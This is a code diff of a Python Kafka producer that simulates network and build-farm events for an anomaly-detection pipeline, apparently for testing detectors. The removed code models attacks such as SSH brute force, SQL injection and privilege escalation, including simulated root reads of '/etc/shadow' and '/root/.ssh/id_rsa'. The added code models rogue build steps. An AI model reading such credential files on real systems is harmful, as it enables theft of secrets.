-        ["HTTP_REQUEST", "LOGIN_SUCCESS", "SSH_CONNECTION", "FILE_ACCESS", "LOGIN_FAILURE", "COMMAND_EXECUTION"],
-        [45, 18, 12, 10, 8, 7],
+    "cloud": (
+        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
+        [44, 16, 8, 9, 12, 5, 2],
     ),
-    "partner": (
-        ["HTTP_REQUEST", "LOGIN_SUCCESS", "LOGIN_FAILURE"],
-        [85, 10, 5],
+    "vendor": (
+        ["COMPILE_STEP", "DEPENDENCY_FETCH", "TEST_RUN", "BUILD_SUCCESS", "BUILD_FAILURE", "BUILD_STARTED"],
+        [50, 20, 14, 8, 6, 2],
     ),
 }
 
 
-def _normal_request(host, user):
-    method, path, status, (lo, hi) = random.choices(NORMAL_REQUESTS, weights=NORMAL_REQUEST_WEIGHTS, k=1)[0]
-    path = path.format(n=random.randint(1, 900))
-    agent = PARTNER_AGENT if host.role == "partner" else random.choice(BROWSERS)
-    return http(host.ip, user, host.hostname, "normal", method, path, status, agent, random.randint(lo, hi))
+def _normal_fetch(host, who, project):
+    lang = LANG_OF.get(project, "c")
+    template, (lo, hi) = random.choice(FETCH_PATHS[lang])
+    path = template.format(n=random.randint(1, 60))
+    roll = random.random()
+    if roll < 0.04:
+        # benign noise that looks alarming in isolation: an optional
+        # checksum sidecar that does not exist, a rate limit, a hiccup
+        status = random.choice([404, 404, 429, 503])
+        return dependency_fetch(host.ip, project, host.hostname, "normal", who, path + ".sha256", status, 150)
+    if roll < 0.20:
+        return dependency_fetch(host.ip, project, host.hostname, "normal", who, path, 304, 0)
+    return dependency_fetch(host.ip, project, host.hostname, "normal", who, path, 200, random.randint(lo, hi))
 
 
 def generate_normal():
     host = random.choices(NETWORK, cum_weights=NETWORK_CUM_WEIGHTS, k=1)[0]
     types, weights = ROLE_PROFILES[host.role]
     event_type = random.choices(types, weights=weights, k=1)[0]
-    user = random.choice(host.users)
+    project = random.choice(host.projects)
+    who = random.choice(host.accounts)
     src, name = host.ip, host.hostname
 
-    if event_type == "HTTP_REQUEST":
-        return _normal_request(host, user)
+    if event_type == "DEPENDENCY_FETCH":
+        return _normal_fetch(host, who, project)
 
-    if event_type == "LOGIN_SUCCESS":
-        auth = "token" if host.role == "partner" else random.choice(["publickey", "publickey", "mfa"])
-        return ssh_login(src, user, name, "normal", True, auth=auth)
+    if event_type == "BUILD_STARTED":
+        return build_started(src, project, name, "normal", who)
 
-    if event_type == "LOGIN_FAILURE":
-        # ordinary human error
-        return ssh_login(src, user, name, "normal", False, auth="password",
-                         reason=random.choice(["invalid_password", "authentication_failure", "session_expired"]))
+    if event_type == "BUILD_SUCCESS":
+        return build_success(src, project, name, "normal", who)
 
-    if event_type == "SSH_CONNECTION":
-        return ssh_connection(src, user, name, "normal")
+    if event_type == "BUILD_FAILURE":
+        # ordinary breakage: the code is wrong, not the machine
+        reason = random.choices(FAILURE_REASONS, weights=FAILURE_REASON_WEIGHTS, k=1)[0]
+        duration = 3_600_000 if reason == "timeout" else None
+        return build_failure(src, project, name, "normal", who, reason,
+                             random.choice(ORDINARY_MESSAGES[reason]),
+                             exit_code=124 if reason == "timeout" else random.choice([1, 1, 2]),
+                             duration=duration)
 
-    if event_type == "FILE_ACCESS":
-        path, op = random.choice(NORMAL_FILES)
-        return file_access(src, user, name, "normal", path.format(user=user), op)
+    if event_type == "TEST_RUN":
+        return tests_run(src, project, name, "normal", who, success=random.random() > 0.06)
 
-    # COMMAND_EXECUTION
-    if host.role == "automation" and user in AUTOMATION_COMMANDS:
-        cmd, process, uid = random.choice(AUTOMATION_COMMANDS[user])
-        return command(src, user, name, "normal", cmd, process, uid, parent="cron")
-    cmd = random.choice(BENIGN_COMMANDS)
-    return command(src, user, name, "normal", cmd, cmd.split()[0], UIDS.get(user, 1500))
+    if event_type == "ARTIFACT_PUBLISH":
+        return artifact_publish(src, project, name, "normal", who, random.randint(500_000, 12_000_000))
+
+    # COMPILE_STEP
+    uid = _uid(host, who)
+    roll = random.random()
+    if roll < 0.015:
+        return compile_step(src, project, name, "normal", who, uid, outcome="failure", exit_code=1,
+                            message=random.choice(ORDINARY_COMPILE_ERRORS))
+    if roll < 0.08:
+        return compile_step(src, project, name, "normal", who, uid, step="link")
+    if roll < 0.10:
+        return compile_step(src, project, name, "normal", who, uid, step="archive", command="ar rcs build/lib.a build/*.o",
+                            process="ar", duration=random.randint(100, 4_000), memory=random.randint(20, 200))
+    return compile_step(src, project, name, "normal", who, uid)
 
 
-# --- attacks --------------------------------------------------------------
+# --- incidents ------------------------------------------------------------
 
-class Attack:
-    """One in-flight attack, emitting `rate` events/sec for `duration`."""
+class Incident:
+    """One in-flight incident on one runner, emitting `rate` events/sec for
+    `duration`. The runner is an ordinary one: it carries on with its normal
+    traffic while the incident runs."""
 
     def __init__(self, kind, duration, rate):
         self.kind = kind
         self.remaining = duration
         self.rate = rate
-        self.compromised = False
-        self.target = random.choice(SSH_TARGETS)
-        self.web_target = random.choice(WEB_SERVERS)
+        self.recovered = False
 
-        if kind in ("lateral_movement", "data_exfiltration"):
-            # Already inside: a compromised workstation. External-IP
-            # heuristics cannot catch either of these.
-            host = random.choice([h for h in NETWORK if h.role == "workstation"])
-            self.source_ip = host.ip
-            self.hostname = host.hostname
-            self.user = host.users[0]
-        else:
-            self.source_ip = random.choice(HOSTILE_IPS)
-            self.hostname = random.choice(NETWORK).hostname
-            self.user = random.choice(ADMINS)
-
-        self.target_user = random.choice(ADMINS)
-        self.agent = random.choice(SCANNER_AGENTS)
+        host = random.choice(NETWORK)
+        self.host = host
+        self.runner_ip = host.ip
+        self.hostname = host.hostname
+        self.project = host.projects[0]
+        self.who = host.accounts[0]
+        self.uid = _uid(host, self.who)
+        # A black-hole runner grabs jobs from the whole queue.
+        self.victims = random.sample(PROJECT_NAMES, random.randint(8, 14))
 
     def tick(self):
         self.remaining -= 1
@@ -461,104 +547,111 @@ class Attack:
     def _emit(self):
         return getattr(self, "_" + self.kind)()
 
-    def _ssh_brute_force(self):
-        # Many failures against ONE account, sometimes ending in success.
-        # The success after a wall of failures is the part that matters.
-        if not self.compromised and self.remaining <= 2 and random.random() < 0.3:
-            self.compromised = True
-            return ssh_login(self.source_ip, self.target_user, self.hostname, self.kind,
-                             True, auth="password", dest=self.target)
-        return ssh_login(self.source_ip, self.target_user, self.hostname, self.kind, False,
-                         auth="password", dest=self.target,
-                         reason=random.choice(["invalid_password", "authentication_failure"]))
+    def _retry_storm(self):
+        # The same project failing again and again on one runner, sometimes
+        # ending in a green build. The pass after a wall of failures is the
+        # part that matters: flaky, not fixed.
+        if not self.recovered and self.remaining <= 2 and random.random() < 0.3:
+            self.recovered = True
+            return build_success(self.runner_ip, self.project, self.hostname, self.kind, self.who)
+        reason = random.choice(["compile_error", "test_failure"])
+        return build_failure(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                             reason, random.choice(ORDINARY_MESSAGES[reason]))
 
-    def _password_spray(self):
-        # One password against MANY accounts -- the inverse of brute force.
-        return ssh_login(self.source_ip, random.choice(EMPLOYEES + SERVICE_ACCOUNTS),
-                         self.hostname, self.kind, False, auth="password",
-                         dest=self.target, reason="invalid_password")
+    def _broken_toolchain(self):
+        # Failures across MANY projects -- the inverse of a retry storm: the
+        # projects are fine, the runner is not.
+        return build_failure(self.runner_ip, random.choice(self.victims), self.hostname, self.kind, self.who,
+                             "toolchain_error", random.choice(TOOLCHAIN_MESSAGES), exit_code=127,
+                             duration=random.randint(200, 4_000))
 
-    def _port_scan(self):
-        return port_probe(self.source_ip, "-", self.hostname, self.kind,
-                          random.choice(SCAN_PORTS), dest=self.target)
+    def _oom_kill_storm(self):
+        # The kernel kills compiler after compiler: exit 137, memory pinned.
+        if random.random() < 0.25:
+            return build_failure(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                                 "oom_killed", random.choice(OOM_MESSAGES), exit_code=137)
+        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
+                            outcome="failure", exit_code=137, message=random.choice(OOM_MESSAGES),
+                            memory=random.randint(7_000, 16_000), duration=random.randint(20_000, 120_000),
+                            cache="miss")
 
-    def _privilege_escalation(self):
-        # Post-compromise on an owned host: an ssh session, a shell, then
-        # the classic moves -- mostly as root once `sudo su -` lands.
-        cmd = random.choice(HOSTILE_COMMANDS)
-        if "shadow" in cmd or "id_rsa" in cmd:
-            return file_access(self.source_ip, self.target_user, self.hostname, self.kind,
-                               "/etc/shadow" if "shadow" in cmd else "/root/.ssh/id_rsa",
-                               "read", uid=0, process="cat")
-        return command(self.source_ip, self.target_user, self.hostname, self.kind,
-                       cmd, cmd.split()[0], 0, parent="sshd")
+    def _slow_compile(self):
+        # Quiet on every axis but one: steps succeed, cache and memory look
+        # ordinary -- and each takes 6 to 25 minutes. Only duration gives it away.
+        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
+                            duration=random.randint(360_000, 1_500_000), cache="miss",
+                            memory=random.randint(1_500, 5_000))
 
-    def _lateral_movement(self):
-        # An internal host sweeping the server range it never normally touches.
-        dest = random.choice(SSH_TARGETS)
-        if random.random() < 0.5:
-            return port_probe(self.source_ip, self.user, self.hostname, self.kind,
-                              random.choice([22, 445, 3389, 5432, 3306]), dest=dest)
-        return ssh_connection(self.source_ip, random.choice(ADMINS), self.hostname, self.kind, dest=dest)
-
-    def _sql_injection(self):
-        status = random.choice([500, 500, 200, 403])
-        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
-                    random.choice(SQLI_PATHS), status, self.agent,
-                    random.randint(300, 9_000), dest=self.web_target)
-
-    def _path_traversal(self):
-        status = random.choice([400, 403, 404, 200])
-        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
-                    random.choice(TRAVERSAL_PATHS), status, self.agent,
-                    random.randint(150, 3_000), dest=self.web_target)
-
-    def _web_scan(self):
-        # Directory brute force: a flood of 404s on paths nobody browses to.
+    def _dependency_not_found(self):
+        # A lockfile pointing at artifacts that were never published, retried
+        # in a loop: a flood of 404s on paths no build asks for.
+        n = random.randint(1, 9_999)
         status = 404 if random.random() < 0.92 else 403
-        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
-                    random.choice(SCAN_PATHS), status, self.agent, 150, dest=self.web_target)
+        return dependency_fetch(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                                f"/maven2/com/acme/legacy-{n}/1.{n % 9}/legacy-{n}-1.{n % 9}.jar", status, 150)
 
-    def _data_exfiltration(self):
-        # Quiet on every axis but one: a normal browser, 200s, a real
-        # endpoint -- and hundreds of megabytes. Only volume gives it away.
-        return http(self.source_ip, self.user, self.hostname, self.kind, "GET",
-                    "/api/v1/reports/export?all=true&format=csv", 200,
-                    BROWSERS[0], random.randint(40_000_000, 120_000_000),
-                    dest=self.web_target, rt=random.randint(2_000, 9_000))
+    def _cache_corruption(self):
+        message = random.choice(CORRUPT_MESSAGES).format(h=uuid.uuid4().hex[:24])
+        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
+                            outcome="failure", exit_code=1, message=message, cache="corrupt",
+                            duration=random.randint(50, 900))
+
+    def _compiler_crash(self):
+        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
+                            outcome="failure", exit_code=139, message=random.choice(CRASH_MESSAGES),
+                            duration=random.randint(2_000, 40_000), cache="miss")
+
+    def _rogue_build_step(self):
+        # A build step that has no business running: a miner, a download
+        # piped into a shell, credentials read out. Often after fetching
+        # something from a mirror the build never uses.
+        if random.random() < 0.4:
+            return dependency_fetch(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                                    random.choice(UNTRUSTED_PATHS), 200, random.randint(20_000, 4_000_000))
+        command = random.choice(ROGUE_COMMANDS)
+        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                            0 if random.random() < 0.7 else self.uid, command=command,
+                            process=command.split()[0].lstrip("./"), parent="sh", duration=random.randint(100, 30_000),
+                            memory=random.randint(20, 400), cache="miss")
+
+    def _artifact_bloat(self):
+        # Uploads that never stop and never fail: a build directory or a
+        # debug-symbol archive published on every build, filling the store.
+        return artifact_publish(self.runner_ip, self.project, self.hostname, self.kind, self.who,
+                                random.randint(40_000_000, 120_000_000), rt=random.randint(2_000, 9_000))
 
 
-ATTACK_KINDS = [
+INCIDENT_KINDS = [
     # kind,                  duration (s),  rate (events/s)
-    ("ssh_brute_force",      (25, 60),      (18, 40)),
-    ("port_scan",            (10, 25),      (12, 30)),
-    ("password_spray",       (30, 70),      (8, 18)),
-    ("privilege_escalation", (8, 20),       (3, 9)),
-    ("lateral_movement",     (15, 40),      (6, 16)),
-    ("sql_injection",        (15, 40),      (4, 12)),
-    ("path_traversal",       (10, 30),      (3, 10)),
-    ("web_scan",             (20, 50),      (15, 35)),
-    ("data_exfiltration",    (20, 60),      (1, 3)),
+    ("retry_storm",          (25, 60),      (18, 40)),
+    ("broken_toolchain",     (30, 70),      (8, 18)),
+    ("oom_kill_storm",       (8, 20),       (3, 9)),
+    ("slow_compile",         (15, 40),      (4, 12)),
+    ("dependency_not_found", (20, 50),      (15, 35)),
+    ("cache_corruption",     (10, 30),      (3, 10)),
+    ("compiler_crash",       (10, 30),      (3, 10)),
+    ("rogue_build_step",     (8, 20),       (3, 9)),
+    ("artifact_bloat",       (20, 60),      (1, 3)),
 ]
 
 
-def maybe_start_attack(active):
-    """At most one new attack per second, never two of the same kind."""
+def maybe_start_incident(active):
+    """At most one new incident per second, never two of the same kind."""
     live = {a.kind for a in active}
 
-    for kind, duration_range, rate_range in ATTACK_KINDS:
+    for kind, duration_range, rate_range in INCIDENT_KINDS:
         if kind in live:
             continue
-        if random.random() < ATTACK_START_CHANCE:
-            attack = Attack(
+        if random.random() < INCIDENT_START_CHANCE:
+            incident = Incident(
                 kind, random.randint(*duration_range), random.randint(*rate_range)
             )
             print(
-                f"  [attack] {kind} from {attack.source_ip} -> "
-                f"{attack.target_user} ({attack.rate}/s for {attack.remaining}s)",
+                f"  [incident] {kind} on {incident.hostname} ({incident.runner_ip}) -> "
+                f"{incident.project} ({incident.rate}/s for {incident.remaining}s)",
                 flush=True,
             )
-            return attack
+            return incident
 
     return None
 
@@ -577,7 +670,7 @@ class AvroSerializer:
 
         if self.schema_id is None:
             raise SystemExit(
-                f"Schema in schemas/security_event.avsc is not registered under "
+                f"Schema in schemas/build_event.avsc is not registered under "
                 f"{subject} at {registry_url}.\n"
                 f"Register it first:  python tools/schema_registry.py register"
             )
@@ -604,8 +697,8 @@ class AvroSerializer:
 def main():
     serializer = AvroSerializer(SCHEMA_REGISTRY_URL)
 
-    # Keyed by source_ip: every event from one IP lands on the same
-    # partition. The feature stage keeps its state per source_ip, so this
+    # Keyed by runner_ip: every event from one runner lands on the same
+    # partition. The feature stage keeps its state per runner_ip, so this
     # is what lets that state stay partition-local as Kafka scales out.
     producer = KafkaProducer(
         bootstrap_servers=KAFKA_BROKER,
@@ -619,40 +712,40 @@ def main():
     for host in NETWORK:
         roles[host.role] = roles.get(host.role, 0) + 1
 
-    print("Starting Watchtower producer (company simulation)")
+    print("Starting Watchtower producer (build-farm simulation)")
     print(f"Kafka: {KAFKA_BROKER}")
     print(f"Topic: {KAFKA_TOPIC}")
     print(f"Rate:  {LOGS_PER_SECOND} logs/sec")
-    print(f"Hosts: {len(NETWORK)} -- " + ", ".join(f"{n} {r}" for r, n in sorted(roles.items())))
-    print(f"Hostile IPs: {len(HOSTILE_IPS)}   attack ceiling: {int(MAX_ATTACK_SHARE*100)}%")
-    print(f"Schema: {DEFAULT_SUBJECT} id={serializer.schema_id} (Avro, keyed by source_ip)", flush=True)
+    print(f"Runners: {len(NETWORK)} -- " + ", ".join(f"{n} {r}" for r, n in sorted(roles.items())))
+    print(f"Projects: {len(PROJECTS)}   incident ceiling: {int(MAX_INCIDENT_SHARE*100)}%")
+    print(f"Schema: {DEFAULT_SUBJECT} id={serializer.schema_id} (Avro, keyed by runner_ip)", flush=True)
 
     active = []
-    attack_budget = int(LOGS_PER_SECOND * MAX_ATTACK_SHARE)
+    incident_budget = int(LOGS_PER_SECOND * MAX_INCIDENT_SHARE)
 
     try:
         while True:
             start = time.perf_counter()
 
-            new = maybe_start_attack(active)
+            new = maybe_start_incident(active)
             if new is not None:
                 active.append(new)
 
             batch = []
-            for attack in list(active):
-                if len(batch) >= attack_budget:
+            for incident in list(active):
+                if len(batch) >= incident_budget:
                     break
-                batch.extend(attack.tick())
-                if attack.remaining <= 0:
-                    active.remove(attack)
+                batch.extend(incident.tick())
+                if incident.remaining <= 0:
+                    active.remove(incident)
 
-            # Attacks never crowd out the baseline: total stays at
+            # Incidents never crowd out the baseline: total stays at
             # LOGS_PER_SECOND and normal traffic fills the remainder.
-            batch = batch[:attack_budget]
+            batch = batch[:incident_budget]
             while len(batch) < LOGS_PER_SECOND:
                 batch.append(generate_normal())
 
-            # Real sources emit continuously, not as one burst per second:
+            # Real runners emit continuously, not as one burst per second:
             # each event is stamped and sent at its own moment, spread
             # evenly over the second. (Stamping 1,000 events and THEN
             # sending them all charged every event the time it took to
@@ -664,7 +757,7 @@ def main():
                 if delay > 0:
                     time.sleep(delay)
                 log["timestamp"] = _now()
-                producer.send(KAFKA_TOPIC, key=log["source_ip"], value=log)
+                producer.send(KAFKA_TOPIC, key=log["runner_ip"], value=log)
 
             time.sleep(max(0, 1 - (time.perf_counter() - start)))
 
